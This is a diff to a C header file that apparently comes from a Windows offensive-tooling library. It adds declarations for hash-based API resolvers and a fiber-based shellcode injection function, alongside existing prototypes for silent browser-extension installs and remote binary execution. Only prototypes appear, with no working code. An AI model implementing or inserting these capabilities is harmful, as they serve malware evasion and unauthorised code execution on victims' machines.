@@ -129,6 +129,10 @@ UINT32 HashStringSuperFastHashA(_In_ PCHAR String);
 UINT32 HashStringSuperFastHashW(_In_ PWCHAR String);
 INT HashStringUnknownGenericHash1A(_In_ PCHAR String);
 INT HashStringUnknownGenericHash1W(_In_ PWCHAR String);
+INT32 HashStringSipHash24A(_In_ PCHAR String);
+INT32 HashStringSipHash24W(_In_ PWCHAR String);
+INT32 HashStringMurmurA(_In_ PCHAR String);
+INT32 HashStringMurmurW(_In_ PWCHAR String);
 BOOL CreateMd5HashFromFilePathW(_In_ PWCHAR FilePath, _Inout_ PWCHAR Md5Hash);
 BOOL CreateMd5HashFromFilePathA(_In_ PCHAR FilePath, _Inout_ PCHAR Md5Hash);
 INT CreatePseudoRandomInteger(_In_ ULONG Seed);
@@ -136,7 +140,6 @@ PWCHAR CreatePseudoRandomStringW(_In_ SIZE_T dwLength, _In_ ULONG Seed);
 PCHAR CreatePseudoRandomStringA(_In_ SIZE_T dwLength, _In_ ULONG Seed);
 BOOL HashFileByMsiFileHashTableW(_In_ PWCHAR Path, _Inout_ PULONG FileHash);
 BOOL HashFileByMsiFileHashTableA(_In_ PCHAR Path, _Inout_ PULONG FileHash);
-
 
 
 /*******************************************
@@ -155,6 +158,8 @@ DWORD64 __stdcall GetProcAddressRotr32(_In_ DWORD64 ModuleBase, _In_ DWORD64 Has
 DWORD64 __stdcall GetProcAddressSdbm(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
 DWORD64 __stdcall GetProcAddressSuperFastHash(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
 DWORD64 __stdcall GetProcAddressUnknownGenericHash1(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
+DWORD64 __stdcall GetProcAddressSipHash(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
+DWORD64 __stdcall GetProcAddressMurmur(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
 DWORD64 __stdcall GetProcAddressA(_In_ DWORD64 ModuleBase, _In_ LPCSTR lpProcName);
 DWORD64 __stdcall GetProcAddressW(_In_ DWORD64 ModuleBase, _In_ LPCWSTR lpProcName);
 BOOL RtlLoadPeHeaders(_Inout_ PIMAGE_DOS_HEADER* Dos, _Inout_ PIMAGE_NT_HEADERS* Nt, _Inout_ PIMAGE_FILE_HEADER* File, _Inout_ PIMAGE_OPTIONAL_HEADER* Optional, _Inout_ PBYTE* ImageBase);
@@ -204,7 +209,7 @@ BOOL GetByteArrayFromFileW(_Inout_ PBYTE Buffer, _In_ PWCHAR Path, _In_ ULONGLON
 BOOL GetByteArrayFromFileA(_Inout_ PBYTE Buffer, _In_ PCHAR Path, _In_ ULONGLONG BytesToRead);
 BOOL Ex_GetHandleOnDeviceHttpCommunication(_Out_ PHANDLE Handle);
 DWORD IsRegistryKeyValidW(_In_ HKEY PredefinedKey, _In_ PWCHAR Path);
-
+DWORD GetCurrentPid(VOID);
 
 /*******************************************
  FINGERPRINTING
@@ -257,7 +262,7 @@ BOOL __unstable__preview__MpfSilentInstallGoogleChromePluginW(_In_ PWCHAR Extens
 BOOL __unstable__preview__MpfSilentInstallGoogleChromePluginA(_In_ PCHAR ExtensionIdentifier);
 BOOL MpfLolExecuteRemoteBinaryByAppInstallerW(_In_ PWCHAR RemoteUrlTextFile, _In_ DWORD RemoteUrlLengthInBytes);
 BOOL MpfLolExecuteRemoteBinaryByAppInstallerA(_In_ PCHAR RemoteUrlTextFile, _In_ DWORD RemoteUrlLengthInBytes);
-
+DWORD ProcessInjectFiberData(_In_ PCHAR Shellcode, _In_ DWORD Length);
 
 
 /*******************************************
